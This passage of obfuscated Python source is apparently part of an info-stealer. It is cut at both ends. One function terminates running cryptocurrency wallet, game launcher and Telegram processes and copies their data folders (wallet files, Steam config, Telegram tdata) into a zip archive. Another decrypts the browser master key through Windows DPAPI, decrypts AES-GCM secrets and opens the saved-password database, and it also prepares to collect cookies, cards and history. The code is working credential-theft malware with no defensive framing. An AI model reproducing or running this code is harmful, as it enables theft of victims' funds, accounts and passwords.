        ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS = sum(len(phrase.split()) for phrase in HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW_files)
    else:
        ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS = 0

    return ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS

def FSNGYPQFUGCLBOSYUZAZSVTQMPFCTWOARCNZHNTDNPWYWWCLJIZSPCOXNQPFSGO(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import os
    import psutil

    NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ = ["Wallets", "Game Launchers", "Apps"]
    WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC         = [] if "Wallets" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ else None
    QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ  = [] if "Game Launchers" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ else None
    RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL            = [] if "Apps" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ else None

    EGTRMOKPDONZWKJSEUDTEXLJTKHSMKYKTYATPQZZZMUZTFLTSDBKNJFWIQMG = [
        ("Zcash",             os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(NVNAPZMIPSCBGEPBWBADLGKKUGCJHZJVOWJGSDDBVMFSDZKJLYVCTVIAFOTFKGCAOKZJWFTATDKDO, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name, v4r_type in EGTRMOKPDONZWKJSEUDTEXLJTKHSMKYKTYATPQZZZMUZTFLTSDBKNJFWIQMG:
            if v4r_type in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name, v4r_type in EGTRMOKPDONZWKJSEUDTEXLJTKHSMKYKTYATPQZZZMUZTFLTSDBKNJFWIQMG:
        if v4r_type in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ and os.path.exists(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
            try:
                if v4r_type == "Wallets" and WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC is not None:
                    WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC.append(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW)
                elif v4r_type == "Game Launchers" and QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ is not None:
                    QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ.append(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW)
                elif v4r_type == "Apps" and RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL is not None:
                    RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL.append(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW)

                FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(os.path.join("Session Files", HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, "path.txt"), ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG)

                if os.path.isdir(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
                    for v4r_root, _, v4r_files in os.walk(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
                        for v4r_file in v4r_files:
                            XCTFLNWSWVPHPNWVGVABAGQRXEBNWDGEGQKIFKZVFAZMYVKODOIUXTNC = os.path.join(v4r_root, v4r_file)
                            DANWNMOOSIXGYZXNKYWTAPGYGMPLVWKLNAQCMXXCGYYTQXJOJUQHHHAKZOGKTFNGHGRAFNXCJPMGPBVZUZCUQYRJSNBSDONMUF = os.path.join(
                                "Session Files", HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, "Files",
                                os.path.relpath(XCTFLNWSWVPHPNWVGVABAGQRXEBNWDGEGQKIFKZVFAZMYVKODOIUXTNC, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG)
                            )
                            try:
                                FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(XCTFLNWSWVPHPNWVGVABAGQRXEBNWDGEGQKIFKZVFAZMYVKODOIUXTNC, DANWNMOOSIXGYZXNKYWTAPGYGMPLVWKLNAQCMXXCGYYTQXJOJUQHHHAKZOGKTFNGHGRAFNXCJPMGPBVZUZCUQYRJSNBSDONMUF)
                            except:
                                pass
                else:
                    DANWNMOOSIXGYZXNKYWTAPGYGMPLVWKLNAQCMXXCGYYTQXJOJUQHHHAKZOGKTFNGHGRAFNXCJPMGPBVZUZCUQYRJSNBSDONMUF = os.path.join("Session Files", HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, "Files", os.path.basename(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG))
                    try:
                        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, DANWNMOOSIXGYZXNKYWTAPGYGMPLVWKLNAQCMXXCGYYTQXJOJUQHHHAKZOGKTFNGHGRAFNXCJPMGPBVZUZCUQYRJSNBSDONMUF)
                    except:
                        pass
            except:
                pass

    if "Wallets" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ:
        WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC = ", ".join(WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC) if WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC else "No"
    if "Game Launchers" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ:
        QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ = ", ".join(QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ) if QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ else "No"
    if "Apps" in NOIMYEJDXKLZUOAIGPSEGGFNQZATQSTEZRPXXSXCSUGCLMREJZ:
        RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL = ", ".join(RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL) if RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL else "No"

    return WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC, QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ, RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL

def XYNBHQRMIVGBWYAGWQYOSHQSVREWMOVIPEIDFJUSBDAQWYAXJBWXEIALCUWMABLXDCJRRJHEDNXXJJYQWS(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ, JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH, TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU, VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ, PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW, PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT

    WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    HKOQSMHAPCRIQEODMNVFVTMHKEMNSLVYFFSPUFYNIEGMCQYHXMRBNCNWZDBTGKHAONMQPIDJEVZRBVKPXYRQISHSICVOPEZN = []

    if "extentions" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ = 0
    else:
        OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ = None

    if "passwords" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV = []
        JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH = 0
    else:
        YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV = ""
        JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH = None
    if "cookies" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN = []
        TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU = 0
    else:
        ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN = ""
        TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU = None
    if "history" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ = []
        VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ = 0
    else:
        BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ = ""
        VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ = None
    if "downloads" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX = []
        PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW = 0
    else:
        KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX = ""
        PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW = None
    if "cards" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT = []
        PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT = 0
    else:
        RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT = ""
        PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT = None
    
    def WHUYWXCTAIGIZTHPEZQPDWVVOAQALWRVRVHJMFPUGGXJDLEANZUXRQPQFMZZOGYUDOFZNVHAPQVYHEPSHJM(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
        if not os.path.exists(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
            return None

        try:
            with open(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, 'r', encoding='utf-8') as v4r_f:
                DPTRTDTMJBXJXSKHJMMCVFGFIMZLFCGOWUTNRHPGKALMSEGEWBLQVUMXGOTMHQYIYJKZDFEC = json.load(v4r_f)

            HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_key = base64.b64decode(DPTRTDTMJBXJXSKHJMMCVFGFIMZLFCGOWUTNRHPGKALMSEGEWBLQVUMXGOTMHQYIYJKZDFEC["os_crypt"]["encrypted_key"])[5:]
            JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX = win32crypt.CryptUnprotectData(HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_key, None, None, None, 0)[1]
            return JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX
        except:
            return None

    def SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX):
        try:
            YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG = BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT[3:15]
            SIGZZBKBAMKEZSMEQQEAYVHSNTEXTADOSQQIUWYRGRKSQTQZSGNMOZRVSVCFX = BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT[15:-16]
            PJGDLVDBCSFAYRMHWYZYSKGPDCMMCCKHVBRFSGESQZOXIVBJLRSKVHMPAYH = BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT[-16:]
            VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF = Cipher(algorithms.AES(JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX), modes.GCM(YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG, PJGDLVDBCSFAYRMHWYZYSKGPDCMMCCKHVBRFSGESQZOXIVBJLRSKVHMPAYH))
            VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE = VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF.decryptor()
            IFQAZWSYMXBLTNGYMWDSEELNTYXYAFRPSNOZCKYPUNWSJSLEVMFBOJLFIJZAHVOTQDXOFVBJVQZYQVCFTLRVXKYKT = VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE.update(SIGZZBKBAMKEZSMEQQEAYVHSNTEXTADOSQQIUWYRGRKSQTQZSGNMOZRVSVCFX) + VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE.finalize()
            return IFQAZWSYMXBLTNGYMWDSEELNTYXYAFRPSNOZCKYPUNWSJSLEVMFBOJLFIJZAHVOTQDXOFVBJVQZYQVCFTLRVXKYKT.decode()
        except:
            return None
        
    def NVDNHKVQBLXSORWBJYDBBFEYTRVROCDJXPBOULOYRULWSURXEIRTQGHLOUTOGMNLVXB(BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX):
        global JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH
        FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT_db = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'Login Data')
        if not os.path.exists(FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT_db):
            return

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT = sqlite3.connect(":memory:")
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ = sqlite3.connect(FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT_db)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.backup(WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.close()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT = WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.cursor()
